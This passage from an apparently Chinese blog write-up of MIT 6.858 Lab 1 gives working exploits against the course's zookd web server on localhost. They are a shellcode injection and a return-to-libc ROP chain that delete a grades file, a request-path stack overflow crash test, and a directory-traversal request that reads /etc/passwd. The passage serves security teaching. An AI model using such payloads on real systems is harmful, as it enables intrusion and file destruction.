class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode_text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* push string */</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x7478742e73656461</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x72672f746e656475</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x74732f656d6f682f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* print the string */</span><br><span class="hljs-string">    mov rdx, 25</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* remove the file */</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax, 87</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* exit normally */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>    payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(req)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>笔者编写的 shellcode 当中有 <code>exit(0)</code> 所以不会报 SIGSEGV，但是有个打印字符串的操作让我们可以直观地看到代码执行成功，如果你想看 SIGSEGV 也可以把最后的 exit 代码去掉：）</p><p><img src="https://s2.loli.net/2022/12/03/2BrKMLp4vlESICT.png" alt="image.png"></p><p>使用如下命令进行测评：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-exstack</span><br></code></pre></td></tr></table></figure><p>通过</p><p><img src="https://s2.loli.net/2022/12/03/AkztJ2qahmWZuOo.png" alt="image.png"></p><h2 id="Part-3-Return-to-libc-attacks"><a href="#Part-3-Return-to-libc-attacks" class="headerlink" title="Part 3: Return-to-libc attacks"></a>Part 3: Return-to-libc attacks</h2><p>接下来终于到了<del>大一小朋友都会的</del> ret2libc 攻击的部分，这一次我们需要使用栈不具有可执行权限的 <code>zookd-nxstack</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-nxstack 8080</span><br></code></pre></td></tr></table></figure><p><strong>返回导向编程</strong>（return-oriented programming， <strong>ROP</strong>）是用来突破包括 ASLR、栈不可执行保护在内的最为经典的攻击手法，<del>你要是不会👴也⑧教你，自己学去</del>，<code>ret2libc</code> 指的则是利用 libc 中的 gadget 来完成 ROP chain 的构建</p><p>实验手册中间的一堆介绍和说明直接跳了，<del>没啥意思</del>，接下来我们大踏步进入 Exercise 5：用 <code>ret2libc</code> 这一攻击手法来完成对 zookd 的攻击</p><blockquote><p><strong>Exercise 5.</strong> Starting from your exploit in Exercises 2 and 4, construct an exploit that unlinks <code>/home/student/grades.txt</code> when run on the binaries that have a non-executable stack. Name this new exploit <code>exploit-5.py</code>.</p><p>In this attack you are going to take control of the server over the network <em>without injecting any code</em> into the server. You should use a return-to-libc attack where you redirect control flow to code that already existed before your attack. The outline of the attack is to perform a buffer overflow that:</p><ol><li>causes the argument to the chosen libc function to be on stack</li><li>then causes <code>accidentally</code> to run so that argument ends up in <code>%rdi</code></li><li>and then causes <code>accidentally</code> to return to the chosen libc function</li></ol><p>It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a> at (1) the point that the buffer overflows and (2) at the point that <code>accidentally</code> runs.</p></blockquote><p>首先 <code>checksec</code> ，除了 canary 以外的保护都开了…</p><p><img src="https://s2.loli.net/2022/12/03/M5TCnY6tDLNB2Fa.png" alt="image.png"></p><p>开了 PIE 比较难弄，虽然我们可以利用 partial overwrite 的方式来在 text 段的同一张页面上进行一次跳转，不过我们还不知道我们的参数到 <code>http_request_headers()</code> 栈底间的距离</p><p>信息泄露这一步比较难弄，于是笔者看了看其他人的做法，发现**大家都是直接用 gdb 看程序以及 libc 的基址…**（<del>👴寻思这①丶也⑧实战啊，</del>估计是为了教学目的降低了难度）</p><blockquote><p>笔者想了大半天怎么构建 ROP、怎么泄露 libc 地址、逆了半天程序找可用的 gadget，最后才知道这个实验是直接用 gdb 查看程序代码段+libc 的地址…<del>挺无语的其实</del></p></blockquote><p>那笔者只好也这么做了（笑），虽然说他提供了一个莫名其妙的 <code>accidentially()</code> 函数但是笔者选择直接忽略，随便找程序中的一个 <code>ret</code> 构造滑板后面跟 ROP 链即可，因为这个 Exercise 说实话做起来莫名其妙的所以笔者也用莫名其妙的解法好了（笑），这里配合 ROPgadget 找了一些 gadget 随便凑了一个可用的 ROP chain：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>    <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br><br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br><br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br><br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br><br>    <span class="hljs-keyword">return</span> req<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br>    sock.send(get_malicious_request())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>笔者的解法简单来说是用 malloc 来分配一个 chunk 往上面写字符串，之后 <code>unlink(chunk)</code> 即可</p><p><img src="https://s2.loli.net/2022/12/04/O5euynk9jE3GoH7.png" alt="image.png"></p><p>使用如下命令进行检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-libc</span><br></code></pre></td></tr></table></figure><p>通过√</p><p><img src="https://s2.loli.net/2022/12/04/ElDbUBFJ3rqatNW.png" alt="image.png"></p><p>然后是一个 <em>Challenge</em> ，<strong>在不依赖 <code>accidentally()</code> 函数的情况下构造 ROP</strong>，提示了我们可以使用 ROPgadget 来寻找 gadget ：</p><blockquote><p><em>Challenge! (optional)</em> The <code>accidentally</code> function is a bit artificial. For extra credit, figure out how to perform the return-to-libc attack without relying on that function (delete it and find another way to make your exploit work). Provide your attack in <code>exploit-challenge.py</code>. Also, briefly explain the attack and provide ROP gadgets you use in <code>answers.txt</code>.</p><p>You will need to find another chunk of code to reuse that gives you control over <code>%rdi</code>. You can read through the disassembly (e.g. using <code>objdump</code>) to look for useful ROP gadgets.</p><p>Because of the nature of x86&#x2F;x86-64, you can use another technique to find sequences of instructions that don’t even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence <code>pop %r15; ret</code> corresponds to the machine code <code>41 5F C3</code>. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code <code>5F C3</code> corresponds to the assembly <code>pop %rdi; ret</code>.</p><p>Automated tools such as <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget.py</a> can assist you in searching for ROP gadgets, even finding gadgets that arise from misaligned parses. The 6.858 VM already has <code>ROPgadget</code> installed.</p><p>You may find it useful to search for ROP gadgets not just in the <code>zookd</code> binary but in other libraries that <code>zookd</code> loads at runtime. To see these libraries, and the addresses at which they are loaded, you can run <strong>( ulimit -s unlimited &amp;&amp; setarch -R ldd zookd-nxstack )</strong>. The <code>ulimit</code> and <code>setarch</code> commands set up the same environment used by <code>clean-env.sh</code>, so that <code>ldd</code> prints the same addresses that will be used at runtime.</p></blockquote><p>笔者一开始的思路就是不用  <code>accidentally()</code> （非常莫名其妙的一个函数），所以等于是直接通过了（笑）</p><h2 id="Part-4-Fixing-buffer-overflows-and-other-bugs"><a href="#Part-4-Fixing-buffer-overflows-and-other-bugs" class="headerlink" title="Part 4: Fixing buffer overflows and other bugs"></a>Part 4: Fixing buffer overflows and other bugs</h2><p>这一块就是两个 Exercise， 先看 Exercise 6，让我们寻找程序中的其他漏洞（至少两个，除了 <code>zoobar</code> 中的以外，那个是留给未来的其他 labs 的）：</p><blockquote><p><strong>Exercise 6.</strong> Look through the source code and try to find more vulnerabilities that can allow an attacker to compromise the security of the web server. Describe the attacks you have found in <code>answers.txt</code>, along with an explanation of the limitations of the attack, what an attacker can accomplish, why it works, and how you might go about fixing or preventing it. You should ignore bugs in <code>zoobar</code>‘s code. They will be addressed in future labs.</p><p>One approach for finding vulnerabilities is to trace the flow of inputs controlled by the attacker through the server code. At each point that the attacker’s input is used, consider all the possible values the attacker might have provided at that point, and what the attacker can achieve in that manner.</p><p>You should find at least two vulnerabilities for this exercise.</p></blockquote><p><del>源码审计还是比较简单的，但是</del>笔者审了大半天好像也没找到除了上面的 bug 以外的 bug，还好后面还是找到了一些</p><p>首先是在 <code>process_client()</code> 中存储请求 URL 的长度的位置存在一个栈溢出，因为一次最多一行读 8192 字节，但这里明显没有预留足够的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<span class="hljs-comment">// 只留了4096字节</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span> <span class="hljs-comment">// 这里一次最多读 8192 字节</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br></code></pre></td></tr></table></figure><p>简单测试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> * <span class="hljs-number">768</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>成功 crash，不过这里并非因为非法返回地址 crash，而是因为我们覆写掉了栈上的 <code>errmsg</code> 变量导致非法内存引用从而 crash</p><p><img src="https://s2.loli.net/2022/12/04/t9vq36KXmZOIslJ.png" alt="image.png"></p><p>第二个漏洞是在 <code>http_serve</code> 中存在目录穿越的问题，由于没有对路径做过滤及判断，这可以让我们访问到服务器根目录外的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = http_serve_none;<br>    <span class="hljs-type">char</span> pn[<span class="hljs-number">2048</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    getcwd(pn, <span class="hljs-keyword">sizeof</span>(pn));<br>    setenv(<span class="hljs-string">&quot;DOCUMENT_ROOT&quot;</span>, pn, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) + <span class="hljs-built_in">strlen</span>(pn) + <span class="hljs-number">1</span> &gt;= <span class="hljs-keyword">sizeof</span>(pn)) &#123;<br>        http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;Request too long&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">strncat</span>(pn, name, <span class="hljs-keyword">sizeof</span>(pn) - <span class="hljs-built_in">strlen</span>(pn) - <span class="hljs-number">1</span>);<br>    split_path(pn);<br><br>    <span class="hljs-keyword">if</span> (!stat(pn, &amp;st))<br>    &#123;<br>        <span class="hljs-comment">/* executable bits -- run as CGI script */</span><br>        <span class="hljs-keyword">if</span> (valid_cgi_script(&amp;st))<br>            handler = http_serve_executable;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(st.st_mode))<br>            handler = http_serve_directory;<br>        <span class="hljs-keyword">else</span><br>            handler = http_serve_file;<br>    &#125;<br><br>    handler(fd, pn);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pn)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">if</span> ((filefd = open(pn, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;open %s: %s&quot;</span>, pn, strerror(errno));<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BSD</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (!fstat(filefd, &amp;st))<br>        len = st.st_size;<br>    <span class="hljs-keyword">if</span> (sendfile(fd, filefd, <span class="hljs-number">0</span>, len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">if</span> (sendfile(filefd, fd, <span class="hljs-number">0</span>, &amp;len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;sendfile&quot;</span>);<br>    close(filefd);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单写个脚本测试下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /../../../../etc/passwd&quot;</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;REQUEST_URI: &quot;</span> + <span class="hljs-string">b&quot;index.html&quot;</span>  + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>成功访问到 <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2022/12/04/dlv6JVCk91QhcyW.png" alt="image.png"></p><p>Exercise 6 里说 <code>You should find at least two vulnerabilities for this exercise.</code> ，笔者已经找足两个，满足了题目要求，就不继续找更多的了（笑）<del>👴选择直接摆大烂</del></p><p>接下来看最后一个 Exercise，让我们进行漏洞修复，主要是修找到的栈溢出漏洞：</p><blockquote><p><strong>Exercise 7.</strong> For each buffer overflow vulnerability you have exploited in Exercises 2, 4, and 5, fix the web server’s code to prevent the vulnerability in the first place. Do not rely on compile-time or runtime mechanisms such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, removing <code>-fno-stack-protector</code>, baggy bounds checking, etc.</p><p>Make sure that your code actually stops your exploits from working. Use <strong>make check-fixed</strong> to run your exploits against your modified source code (as opposed to the staff reference binaries from <code>bin.tar.gz</code>). These checks should report FAIL (i.e., exploit no longer works). If they report PASS, this means the exploit still works, and you did not correctly fix the vulnerability.</p><p>Note that your submission should <em>not</em> make changes to the <code>Makefile</code> and other grading scripts. We will use our unmodified version during grading.</p><p>You should also make sure your code still passes all tests using <strong>make check</strong>, which uses the unmodified lab 